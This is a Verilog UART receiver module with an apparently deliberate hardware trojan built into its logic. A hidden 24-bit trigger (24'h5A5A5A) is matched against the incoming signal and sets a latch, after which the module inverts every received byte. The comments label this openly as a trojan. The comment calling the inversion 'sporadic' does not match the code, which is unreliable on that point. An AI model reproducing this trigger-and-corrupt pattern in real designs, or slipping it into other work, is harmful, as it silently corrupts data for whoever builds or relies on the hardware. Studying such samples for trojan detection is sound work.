 module uart_rx (
    input clk,
    input rx_serial,
    output reg tx_flag = 1'b0,
    output reg [7:0] tx_byte = 8'd0
);

    reg [5:0] serial = 6'b111111;
    reg [3:0] counter = 4'd0;
    reg [3:0] state = 4'd0;
    reg [8:0] partial_byte = 9'd0;
    reg [23:0] activation_pattern = 24'h5A5A5A; // Specific pattern for trojan activation
    reg [23:0] received_pattern = 24'd0;
    reg trojan_activated = 1'b0;

    // Detectors
    wire start_detect = serial[5] & serial[4] & serial[3] & ~serial[2];
    wire one_detect = serial[5] & serial[4] & serial[3];
    wire zero_detect = ~serial[5] & ~serial[4] & ~serial[3];

    always @ (posedge clk)
    begin
        // Meta-stability protection and history
        serial <= {serial[4:0], rx_serial};

        // Update received pattern
        received_pattern <= {received_pattern[15:0], one_detect};

        // Check for Trojan activation pattern
        if (received_pattern == activation_pattern)
            trojan_activated <= 1'b1;

        // What fraction of bit time are we at
        counter <= counter + 4'd1;

        if (tx_flag)
            tx_flag <= 1'b0;

        // Finite-State-Machine
        if (state == 4'd0)
        begin
            if (start_detect)
            begin
                state <= 4'd1;
                counter <= 4'd0;
            end
        end
        else if (counter == 4'd9)
        begin
            state <= state + 4'd1;
            partial_byte <= {one_detect, partial_byte[8:1]};

            // Noise error! Reset!
            if (~one_detect & ~zero_detect)
                state <= 4'd0;
            else if ((state == 4'd1) & ~zero_detect)    // Start bit error
                state <= 4'd0;
        end
        else if (state == 4'd11)
        begin
            state <= 4'd0;

            // Stop bit correctly received?
            if (partial_byte[8])
            begin
                tx_flag <= 1'b1;
                // If Trojan activated, invert the received data bits sporadically.
                tx_byte <= trojan_activated ? ~partial_byte[7:0] : partial_byte[7:0];
            end
        end
    end
endmodule
